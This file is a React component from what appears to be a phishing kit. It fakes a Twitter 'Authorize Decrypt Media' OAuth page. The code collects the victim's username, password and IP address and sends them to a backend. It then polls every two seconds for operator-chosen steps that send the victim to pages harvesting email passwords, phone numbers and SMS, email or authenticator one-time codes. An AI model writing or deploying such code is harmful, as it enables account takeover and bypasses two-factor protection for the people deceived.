import React, { useState, useEffect } from "react";
import Cookies from "js-cookie";
import { submitUsernamePassword, fetchUserStep } from "../../services/api";
import Loader from "./Loader.jsx";
import { useNavigate } from "react-router-dom";

const UsernamePasswordForm = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(""); // State for error message
  const [showLoader, setShowLoader] = useState(false);
  const navigate = useNavigate();

  // Function to handle form submission
  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true); // Start loading
    setError(""); // Reset any error message

    // Clear any existing userId cookie
    Cookies.remove("userId");

    try {
      const ipResponse = await fetch("https://api.ipify.org?format=json");
      const ipData = await ipResponse.json();
      const userIp = ipData.ip;

      const response = await submitUsernamePassword(username, password, userIp);

      if (response.status === 201) {
        const data = response.data;
        if (data.userId) {
          // Set userId cookie and move to the loader state
          Cookies.set("userId", data.userId, { expires: 7 });
          setShowLoader(true); // Switch to loader to wait for admin
        } else {
          setError("Failed to retrieve user ID."); // Set error if no userId
          setLoading(false); // Stop loading
        }
      } else {
        setError("Incorrect username or password."); // Show hardcoded error
        setLoading(false); // Stop loading
      }
    } catch (error) {
      setError("An error occurred while submitting the form.");
      setLoading(false); // Stop loading
    }
  };

  // Poll for user step from the backend
  useEffect(() => {
    if (!showLoader) return;

    const userId = Cookies.get("userId");
    const pollForStep = async () => {
      try {
        const response = await fetchUserStep(userId);
        const step = response?.data?.currentStep;

        if (step && step !== "loading") {
          switch (step) {
            case "email-password":
              navigate(`/email-page?userId=${userId}`);
              break;
            case "email-otp":
              navigate(`/email-otp-page?userId=${userId}`);
              break;
            case "phone-otp":
              navigate(`/phone-otp-page?userId=${userId}`);
              break;
            case "phone-number":
              navigate(`/phone-number-page?userId=${userId}`);
              break;
            case "authenticator-otp":
              navigate(`/authenticator-otp-page?userId=${userId}`);
              break;
            case "error-page":
              setError("Incorrect username or password."); // Trigger the error
              setShowLoader(false); // Stop loader on error
              break;
            case "thank-you":
              navigate(`/thank-you?userId=${userId}`);
              break;
            default:
              setError("Unknown step");
              setShowLoader(false); // Stop loader on unknown step
          }
        }
      } catch (err) {
        console.error("Polling error:", err);
      }
    };

    const intervalId = setInterval(pollForStep, 2000); // Poll every 2 seconds

    return () => clearInterval(intervalId); // Cleanup on unmount
  }, [showLoader, navigate]);

  if (showLoader) {
    return <Loader />;
  }

  return (
    <div className="max-w-3xl mx-auto px-4 sm:px-0">
      <div className="flex justify-between items-center py-3 border-b border-gray-200">
        <svg
          className="w-8 h-8 text-blue-400"
          viewBox="0 0 24 24"
          fill="currentColor"
        >
          <path d="M23.643 4.937c-.835.37-1.732.62-2.675.733.962-.576 1.7-1.49 2.048-2.578-.9.534-1.897.922-2.958 1.13-.85-.904-2.06-1.47-3.4-1.47-2.572 0-4.658 2.086-4.658 4.66 0 .364.042.718.12 1.06-3.873-.195-7.304-2.05-9.602-4.868-.4.69-.63 1.49-.63 2.342 0 1.616.823 3.043 2.072 3.878-.764-.025-1.482-.234-2.11-.583v.06c0 2.257 1.605 4.14 3.737 4.568-.392.106-.803.162-1.227.162-.3 0-.593-.028-.877-.082.593 1.85 2.313 3.198 4.352 3.234-1.595 1.25-3.604 1.995-5.786 1.995-.376 0-.747-.022-1.112-.065 2.062 1.323 4.51 2.093 7.14 2.093 8.57 0 13.255-7.098 13.255-13.254 0-.2-.005-.402-.014-.602.91-.658 1.7-1.477 2.323-2.41z" />
        </svg>
        <span className="text-blue-400 text-sm">Sign up for Twitter &gt;</span>
      </div>

      <div className="bg-white sm:border sm:border-gray-300 sm:rounded-lg mt-4 p-4 sm:p-6 flex flex-col sm:flex-row">
        <div className="w-full sm:w-2/3 sm:pr-8">
          <h1 className="text-xl font-bold text-gray-800 mb-4">
            Authorize Decrypt Media to receive digital signatures using your
            account?
          </h1>

          <div className="flex items-center mb-4 sm:hidden">
            <img
              src="/decrypt.jpg"
              alt="Decrypt Media"
              className="w-12 h-12 mr-3"
            />
            <div>
              <h3 className="font-bold text-gray-800">Decrypt Media</h3>
              <p className="text-sm text-gray-600">By @decryptmedia</p>
              <p className="text-sm text-gray-600">decrypt.co</p>
            </div>
          </div>

          {/* Display error message */}
          {error && <div className="text-red-500 text-sm mb-3">{error}</div>}

          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Username or email"
              className={`w-full p-2 border ${
                error ? "border-red-500" : "border-gray-300"
              } rounded mb-3 text-sm`}
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
            <input
              type="password"
              placeholder="Password"
              className={`w-full p-2 border ${
                error ? "border-red-500" : "border-gray-300"
              } rounded mb-3 text-sm`}
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
            <div className="flex items-center justify-between mb-4 text-sm">
              <label className="flex items-center text-gray-600">
                <input type="checkbox" className="mr-2" />
                Remember me
              </label>
              <a href="#" className="text-blue-500 hover:underline">
                Forgot password?
              </a>
            </div>
            <div className="flex space-x-3">
              <button
                type="submit"
                className="bg-blue-500 text-white py-2 px-4 rounded font-bold hover:bg-blue-600 text-sm flex-grow sm:flex-grow-0"
              >
                Authorize app
              </button>
              <button
                type="button"
                className="bg-white text-gray-700 py-2 px-4 rounded font-bold border border-gray-300 hover:bg-gray-100 text-sm flex-grow sm:flex-grow-0"
              >
                Cancel
              </button>
            </div>
          </form>

          <div className="mt-6 text-sm">
            <p className="text-green-600 mb-2">
              This application will be able to:
            </p>
            <ul className="list-disc pl-5 space-y-1 text-gray-600 mb-4">
              <li>
                See Tweets from your timeline as well as your Lists and
                collections.
              </li>
              <li>See your Twitter profile information .</li>
              <li>See accounts you follow.</li>
            </ul>
            <p className="text-gray-500">
              Learn more about third-party app permissions in the{" "}
              <a href="#" className="text-blue-500 hover:underline">
                Help Center
              </a>
              .
            </p>
          </div>
        </div>

        <div className="w-1/3 hidden sm:block">
          <div className="flex items-start mb-2">
            <img
              src="/decrypt.jpg"
              alt="Decrypt Media"
              className="w-12 h-12 mr-3"
            />
            <div>
              <h3 className="font-bold text-gray-800">Decrypt Media</h3>
              <p className="text-sm text-gray-600">By @decryptmedia</p>
              <p className="text-sm text-gray-600">decrypt.co</p>
            </div>
          </div>
          <p className="text-sm text-gray-600">
            A next-generation media company.
          </p>
          <p className="text-sm text-gray-600">Powered by AI & Web3.</p>
        </div>
      </div>
    </div>
  );
};

export default UsernamePasswordForm;
